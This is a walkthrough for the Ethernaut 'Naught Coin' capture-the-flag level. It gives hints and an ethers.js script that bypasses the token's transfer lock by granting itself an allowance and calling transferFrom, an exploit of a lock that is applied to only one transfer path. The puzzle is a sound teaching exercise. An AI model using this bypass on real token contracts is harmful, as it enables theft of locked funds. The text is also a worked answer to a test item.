# 15 - Naught Coin

### Hints

<details>

<summary>Hint One</summary>

The `NaughtCoin` contract extends the OpenZeppelin `ERC20` contract, which means it has inherited variables and functions not present in its own source code. Perhaps you can find a way to get around the `lockTokens`ex modifier there?

</details>

<details>

<summary>Hint Two</summary>

You will need to solve this challenge in two steps. The first is to increase the allowance your player account is allowed to spend via the ERC20 contract’s `increaseAllowance` function.

</details>

### Scripted Solution

```javascript
const ethers = require('ethers')
const fs = require('fs')
require('dotenv').config({ path: './.env' })

/**
 * Initialize Ethers objects needed to interact with the blockchain and
 * contract.
 */
async function setup(contractName) {
  // Create provider - a read-only abstraction to access blockchain data
  const provider = new ethers.providers.InfuraProvider(process.env.NETWORK)
  // Create player wallet
  const playerWallet = new ethers.Wallet(process.env.PRIVATE_KEY)
  // Create player wallet signer - an abstraction of an Ethereum account
  const playerWalletSigner = await playerWallet.connect(provider)
  // Create contract instance - an abstraction of the deployed contract code
  const contractAbi = fs.readFileSync(`./${contractName}.abi`, 'utf8')
  const contract = new ethers.Contract(
    process.env.CONTRACT_ADDRESS,
    contractAbi,
    playerWalletSigner
  )

  return {
    provider,
    playerOneAddress: process.env.PLAYER_ONE_ADDRESS,
    playerTwoAddress: process.env.PLAYER_TWO_ADDRESS,
    playerWallet,
    playerWalletSigner,
    contract
  }
}

/**
 * Run contract exploit.
 */
async function main() {
  // Get Ethers objects needed to interact with the blockchain and contract
  const {
    playerOneAddress,
    playerTwoAddress,
    contract: naughtCoinContract
  } = await setup('NaughtCoin')

  // Get player one balance
  const playerOneBalance = await naughtCoinContract.balanceOf(playerOneAddress)

  // Allow player one to spend own tokens
  console.log("Increasing player one's spending allowance...")
  const increasePlayerOneAllowance = await naughtCoinContract.increaseAllowance(
    playerOneAddress,
    playerOneBalance
  )
  await increasePlayerOneAllowance.wait(1)

  // Transfer player one balance to player two
  console.log("Transfering all of player one's coins to player two...")
  const transferFromToPlayerTo = await naughtCoinContract.transferFrom(
    playerOneAddress,
    playerTwoAddress,
    playerOneBalance,
    {
      gasLimit: 100000,
      gasPrice: 20000000000
    }
  )
  await transferFromToPlayerTo.wait(1)

  // Get player one's updated balance
  const playerOneUpdatedBalance = await naughtCoinContract.balanceOf(
    playerOneAddress
  )
  console.log(`Player one's balance now: ${playerOneUpdatedBalance}`)
}

main()
  .then(() => process.exit(0))
  .catch(error => {
    console.error(error)
    process.exit(1)
  })
```
